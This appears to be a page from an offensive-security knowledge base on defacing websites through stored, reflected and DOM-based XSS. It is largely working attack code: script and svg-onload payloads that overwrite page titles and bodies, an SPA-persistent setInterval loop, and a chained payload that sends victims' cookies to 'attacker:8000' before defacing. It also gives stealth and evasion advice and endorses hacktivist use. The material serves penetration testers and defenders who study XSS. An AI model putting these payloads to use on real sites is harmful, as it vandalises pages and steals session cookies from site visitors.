@@ -1,0 +1,356 @@
+---
+title: Defacement
+description: Visual disruption of a target page via stored XSS - background color and image manipulation, page title overwrite, body text replacement via innerHTML, and the operational reality that defacement is loud and almost never the actual objective. Defacement is useful as proof-of-impact for stored XSS findings, as hacktivist payload, or as deliberate red-team theatrics; it should never replace the data-theft path that's quieter and more valuable.
+mitre: [T1059.007, T1491, T1491.002]
+d3fend: [D3-CBV]
+impact: [Defacement, Integrity]
+owasp: [A03]
+sidebar:
+  order: 5
+  label: Defacement
+---
+
+## TL;DR
+
+Defacement uses JavaScript executed via stored XSS to overwrite visible elements of a target page - background, title, and body content. Loud by design, useful for proof-of-impact screenshots and hacktivist demonstrations, but operationally inferior to silent data-theft payloads in every other case.
+
+```
+# Three primitives, combinable
+<script>document.body.style.background = "#141d2b"</script>
+<script>document.title = "Owned"</script>
+<script>document.body.innerHTML = "<h1>Defaced</h1>"</script>
+
+# Or one combined payload
+<script>
+  document.body.style.background = "#000";
+  document.title = "Owned";
+  document.body.innerHTML = '<center><h1 style="color:red">DEFACED</h1></center>';
+</script>
+```
+
+Success indicator: every subsequent visitor to the affected page sees the modified content. For stored XSS the change persists until the underlying database record is cleaned. For reflected XSS it persists only for victims who click the crafted URL.
+
+## When defacement is the right tool
+
+Most XSS engagements should *not* use defacement. The standard payoff path is silent: steal session cookies (see [XSS to session](/codex/web/sessions/xss-to-session/)), exfiltrate data from authenticated pages, chain into CSRF for state changes (see [XSS-CSRF chain](/codex/web/sessions/xss-csrf-chain/)). Each is quieter and more valuable.
+
+Defacement is correct when:
+
+| Scenario | Why defacement |
+| --- | --- |
+| **Bug bounty proof-of-impact** | A screenshot of a defaced page makes the report unambiguous in a way that "I read your `document.cookie`" doesn't |
+| **Red team noise-generation** | Sometimes the engagement wants the blue team to detect *something*; defacement is detectable by design |
+| **Hacktivism / authorized public-impact ops** | When the objective explicitly is visible disruption |
+| **Time-limited persistence proof** | "I had write access at 15:42:00 UTC, observe this banner" |
+| **CTF / lab targets with no real users** | No operational downside; impact is the flag-equivalent |
+
+Defacement is wrong when:
+
+- The engagement is data-theft focused (every defacement payload competes with a silent exfil payload)
+- Other users will see the defacement and the engagement is meant to be undetected
+- Stakeholders haven't authorized "page modified" as an acceptable outcome
+- The vulnerable page is heavily monitored (banner / SEO / brand-protection alerting)
+
+When in doubt, deface a *staging* clone of the target if you have access, capture the screenshot, and use the silent payload against production.
+
+## The three defacement primitives
+
+### Background color or image
+
+```javascript
+// Solid color
+document.body.style.background = "#141d2b";
+document.body.style.background = "red";
+document.body.style.background = "rgb(20, 29, 43)";
+
+// Image URL
+document.body.background = "https://attacker.example.com/banner.svg";
+
+// Or CSS shorthand
+document.body.style.cssText = "background:#000 url(http://attacker/x.png) no-repeat center;";
+```
+
+`document.body.style.background` is the CSS-style property setter (modern). `document.body.background` is the legacy HTML attribute (older browsers only, but still supported). Either works for solid disruption. For image-based defacement, the image needs to be hosted somewhere the target's browser can reach - attacker-controlled HTTP server, public image host, or a `data:` URL embedded inline:
+
+```javascript
+// data: URL embeds the image inline; no separate HTTP fetch needed
+document.body.style.backgroundImage = "url(data:image/svg+xml;base64,PHN2Zy...)";
+```
+
+### Page title
+
+```javascript
+document.title = "Owned by Squad-X";
+```
+
+Affects the browser tab and history. Often the first thing a user notices because tab titles are visible even when the page itself isn't focused. Often missed by attackers because they're focused on body changes.
+
+For added effect, animate the title:
+
+```javascript
+let frames = ["O", "Ow", "Own", "Owne", "Owned"];
+let i = 0;
+setInterval(() => { document.title = frames[i++ % frames.length]; }, 500);
+```
+
+The marquee effect is gratuitous in a real op but characteristic of hacktivist defacement.
+
+### Body content replacement
+
+The biggest hammer - wipe everything and write your own HTML:
+
+```javascript
+document.body.innerHTML = '<center><h1 style="color:red">Site Hacked</h1></center>';
+```
+
+Replaces every child of `<body>`. The original page's scripts, forms, navigation - all gone.
+
+For preserved structure with subtle changes, target a specific element instead:
+
+```javascript
+// Target by ID
+document.getElementById("main-content").innerHTML = "DEFACED";
+
+// Target by tag
+document.getElementsByTagName("h1")[0].innerHTML = "Owned";
+
+// jQuery if loaded
+$("#footer").html("Pwned by Squad-X");
+$("h1").html("DEFACED");
+```
+
+`document.getElementsByTagName("body")[0].innerHTML` is equivalent to `document.body.innerHTML`. The full-body wipe is the most common form.
+
+## Combining the primitives
+
+A typical defacement payload combines all three for maximum visual impact:
+
+```html
+<script>
+  // Dark background - common defacement aesthetic
+  document.body.style.background = "#000";
+  // Title for tab-level visibility
+  document.title = "DEFACED";
+  // Replace entire body
+  document.body.innerHTML = `
+    <center style="margin-top:20%">
+      <h1 style="color:#f00;font-family:monospace;font-size:80px">HACKED</h1>
+      <p style="color:#fff;font-family:monospace;font-size:24px">
+        Site security: 0/10. Patch your XSS.<br>
+        - Squad-X | Internet 1969–2024
+      </p>
+    </center>
+  `;
+</script>
+```
+
+Pre-test the HTML in a local browser before embedding. Once injected, the original page's CSS may not apply (you've replaced the body), so your inline `style=` attributes need to carry all the styling.
+
+### Building the payload via `innerHTML` template
+
+For complex defacement, build the HTML as a multi-line template, then minify into a one-liner for injection:
+
+```html
+<!-- defacement.html - design separately -->
+<center style="margin-top: 20%; font-family: monospace;">
+    <h1 style="color: #f00; font-size: 80px;">PWNED</h1>
+    <p style="color: #fff; font-size: 24px;">
+        by Squad-X
+    </p>
+    <img src="https://attacker.example.com/logo.svg" style="width: 200px;">
+</center>
+```
+
+Minify:
+
+```shell
+$ cat defacement.html | tr '\n' ' ' | sed 's/  */ /g'
+<center style="margin-top: 20%; font-family: monospace;"> <h1 style="color: #f00; font-size: 80px;">PWNED</h1> <p style="color: #fff; font-size: 24px;"> by Squad-X </p> <img src="https://attacker.example.com/logo.svg" style="width: 200px;"> </center>
+```
+
+Then embed in the payload:
+
+```html
+<script>document.body.innerHTML = '<center style="margin-top: 20%; ...">...</center>';</script>
+```
+
+Escape single quotes in the HTML if your wrapper uses them. JavaScript template literals (backticks) handle multi-line HTML cleanly:
+
+```html
+<script>document.body.innerHTML = `<center>...</center>`;</script>
+```
+
+Template literals also let you interpolate `${}` expressions, useful if you want to embed dynamic content (the victim's IP, the current time, exfiltrated data).
+
+## Persistent defacement via stored XSS
+
+For maximum durability, the payload should be injected into a stored XSS sink (see [Stored XSS](/codex/web/xss/stored/)). Every page render fires the payload again - the defacement appears for every visitor.
+
+Common stored XSS sinks suitable for defacement:
+
+| Sink | Defacement scope |
+| --- | --- |
+| Public comment / forum post | Page-level - every viewer of that thread |
+| User profile bio rendered on profile pages | Profile-level - every viewer of that user's profile |
+| Site-wide banner / announcement (admin-injectable) | Site-wide - every page of the application |
+| Header/footer template field | Site-wide |
+| Email signature rendered in webmail | Per-email-view |
+
+Site-wide stored XSS is the textbook defacement-worthy finding. A single XSS into a header template can deface every page of the application until the database record is cleaned.
+
+### Removing the original content first
+
+Stored XSS payloads often appear inside the original page content (a comment in a comment list). The original page elements around the payload remain visible unless you explicitly remove them:
+
+```html
+<script>
+  // Wipe the original content, then write defacement
+  document.body.innerHTML = '<h1>DEFACED</h1>';
+</script>
+```
+
+If the payload is inside a constrained element (a `<div class="comment">`), `document.body.innerHTML = ...` reaches outside that container and wipes the whole body. The defacement fully replaces the original page.
+
+For partial defacement (replacing only specific page sections), use targeted DOM manipulation:
+
+```html
+<script>
+  // Hide everything except your defacement target
+  document.querySelectorAll("nav, header, footer").forEach(el => el.style.display = "none");
+  document.querySelector("main").innerHTML = '<h1>DEFACED</h1>';
+</script>
+```
+
+## Defacement via reflected XSS - per-victim only
+
+When the vulnerability is reflected (not stored), defacement only fires for victims who follow the crafted URL. The page isn't actually modified on the server.
+
+```
+http://target/search?q=<script>document.body.innerHTML='DEFACED'</script>
+```
+
+URL-encoded:
+
+```
+http://target/search?q=%3Cscript%3Edocument.body.innerHTML%3D%27DEFACED%27%3C%2Fscript%3E
+```
+
+A reflected-XSS defacement is operationally weaker - it's not really a defacement of the target, it's a defacement of the *victim's view* of the target. The page hasn't changed for anyone who doesn't follow your URL.
+
+Useful for:
+
+- Phishing-adjacent attacks where the victim sees a "compromised" version of the page and panics (low-grade social engineering)
+- Bug bounty proof of stored-XSS-capable bug class even when only reflected is currently exploitable
+- CTF where you control the victim's click anyway
+
+Not useful for actual public defacement - the target's "real" page is unchanged.
+
+## DOM-based defacement
+
+For DOM-based XSS, the same defacement primitives work - the payload runs entirely in the victim's browser:
+
+```
+http://target/#<script>document.body.innerHTML='DEFACED'</script>
+```
+
+The hash-fragment payload never reaches the server, so the server-side logs may not capture the attack. From the defender's perspective, only the rendered page shows the defacement; the underlying HTML/database is clean.
+
+See [DOM-based XSS](/codex/web/xss/dom-based/) for the source-to-sink methodology that finds these sinks.
+
+## Anti-defacement defenses
+
+Knowing what defenders deploy tells you what to expect:
+
+| Defense | Effect on defacement |
+| --- | --- |
+| Content Security Policy `script-src 'self'` | Blocks `<script>` injection unless attacker can host on same origin |
+| Output encoding (`htmlspecialchars` everywhere) | Blocks the XSS entirely; no defacement possible |
+| Sanitizers (DOMPurify, sanitize-html) | Strips `<script>` and dangerous attributes from stored content |
+| Page-integrity monitoring (canary text checks) | Defenders detect defacement within minutes; rollback automated |
+| Brand-protection services (Google Safe Browsing) | Defaced pages get blacklisted; visitors see browser warnings |
+
+These don't matter for the XSS *finding* - defacement is just one possible payload. They matter for *defacement specifically*: a target with output encoding has no XSS to deface, and a target with brand-protection has defacement that doesn't reach end users.
+
+## Operational risk profile
+
+Defacement payloads create the loudest possible XSS finding:
+
+| Detector | Defacement signal |
+| --- | --- |
+| End users | Highly visible - title changes, content gone, page broken |
+| Application monitoring (synthetic checks) | Often catches title/content changes within minutes |
+| Customer support tickets | Spike in "site is broken" tickets within hours |
+| Social media | "@target your site is hacked" tweets within hours |
+| Brand monitoring | Google Alerts, Reddit watch, etc. flag the change |
+| WAF/IDS | Modern WAFs detect `document.body.innerHTML` patterns in request bodies |
+| Page-integrity systems | Tripwire-style file integrity / DOM canary checks |
+
+If the engagement requires stealth, do not deface. Even a brief defacement creates evidence: archive.org may snapshot it, customer screenshots may circulate, monitoring systems log it for incident review.
+
+## Defacement payload variations
+
+### Minimal - for length-restricted fields
+
+```html
+<svg onload=document.body.innerHTML='PWN'>
+```
+
+35 bytes. Fits in most short-field XSS sinks.
+
+### CSP-respecting - when inline `<script>` is blocked
+
+```html
+<svg onload="document.body.innerHTML='PWN'">
+```
+
+Event handler attribute fires in many CSP-stripping setups (Sanitizer libraries that miss event handlers).
+
+### Persistent setInterval - to survive page navigation in SPAs
+
+```html
+<script>
+  setInterval(() => {
+    document.title = "DEFACED";
+    if (document.body) document.body.innerHTML = '<h1>HACKED</h1>';
+  }, 100);
+</script>
+```
+
+Re-applies the defacement 10x per second. Useful in Single-Page Applications that re-render the body on route changes - the defacement persists across "page" changes within the SPA.
+
+### Defacement + cookie exfil chained
+
+The data-theft + visible-impact combo:
+
+```html
+<script>
+  // Quietly exfiltrate first (don't burn opportunity if defacement triggers detection)
+  new Image().src = "http://attacker:8000/?c=" + btoa(document.cookie);
+  // Then deface
+  setTimeout(() => {
+    document.body.innerHTML = '<h1>HACKED</h1>';
+  }, 1000);
+</script>
+```
+
+The 1-second delay lets the cookie request fly before the visual change triggers user attention.
+
+## Quick reference
+
+| Task | Pattern |
+| --- | --- |
+| Change background color | `document.body.style.background = "#000"` |
+| Change background image | `document.body.background = "URL"` or `document.body.style.backgroundImage = "url(URL)"` |
+| Change page title | `document.title = "DEFACED"` |
+| Replace body content | `document.body.innerHTML = "HTML"` |
+| Replace specific element | `document.getElementById("X").innerHTML = "HTML"` |
+| jQuery equivalent | `$("body").html("HTML")`, `$("#x").html("HTML")` |
+| Combined defacement | `document.body.style.background="#000"; document.title="X"; document.body.innerHTML="HTML"` |
+| Minify HTML for inline | `cat file.html \| tr '\n' ' ' \| sed 's/  */ /g'` |
+| Multi-line HTML in JS | Use template literals: ``document.body.innerHTML = `<h1>X</h1>` `` |
+| Length-restricted defacement | `<svg onload=document.body.innerHTML='X'>` |
+| SPA-survival defacement | `setInterval` re-applying every 100ms |
+| Exfil + deface combo | Cookie steal first, defacement on `setTimeout` |
+| When NOT to deface | Stealth ops, data-theft engagements, monitored targets, anything that needs to stay undetected |
+
+For the data-theft path that's usually the better choice, see [XSS to session](/codex/web/sessions/xss-to-session/). For impersonation attacks via fake login forms (the other common XSS attack pattern), see [Phishing injection](/codex/web/xss/phishing-injection/). For getting the XSS payload into the page in the first place, see [Reflected](/codex/web/xss/reflected/), [Stored](/codex/web/xss/stored/), and [DOM-based](/codex/web/xss/dom-based/).
